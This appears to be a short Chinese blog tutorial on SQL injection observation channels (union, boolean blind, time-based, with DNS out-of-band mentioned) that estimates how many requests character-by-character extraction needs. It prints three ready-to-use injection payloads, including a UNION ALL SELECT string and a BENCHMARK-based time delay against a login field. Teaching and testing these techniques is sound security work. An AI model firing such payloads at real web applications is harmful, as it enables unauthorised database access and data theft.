ailx10说：这篇是在2023年8月之前写的，后来又改过。有的注入一报错就带出信息，有的页面安安静静，连想看的字都不肯直接给。我就把几种回显方式排在一页：错误、联合查询、真假差异、时间变化，再到 DNS 外带，看看同一个问题换了观察窗口会怎样。后面还顺手算了按字符二分推测需要多少次请求，让“慢”也有个具体尺度。这篇不是又收集一堆花样，更像在练一件事：结果没有直接写在页面上时，还能从哪一种变化里得到回答。

通过sql注入将表中的内容直接打印在页面上，也就是常说的union select注入。这种注入只需简单几次查询，就能拿到数据库中的内容。

```
id=-2814' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71787a7871,0x75414b78675745746f6d614657504f744c565a7655675a716e76694f5256466e4d46684254454b59,0x716b766b71),NULL,NULL,NULL,NULL,NULL-- -
```

![](/notes-assets/0cbaee4ae15d3e6651e9.webp)

通过sql注入，观察内容是否显示的差异来判断结果，也就是bool型注入。bool注入每个字符查询需要6次，2的6次方是64，也就是包括26个小写英文，26个大写英文，10个数字，进行二分查找。

```
id=38' AND 6419=6419 AND 'ZIJW'='ZIJW
```

![](/notes-assets/ab20bfb08bc0bd81c8e0.webp)

布尔盲注

无法回显，也无法从内容上表现出异常，就需要通过时间盲注或dns带外注入来查询。时间注入每个字符查询需要6次，每次需要3～5秒，注出每个字符大约要30秒。

```
user_=1' AND 2907=BENCHMARK(5000000,MD5(0x524e484c)) AND 'DBMZ'='DBMZ&psd=1
```
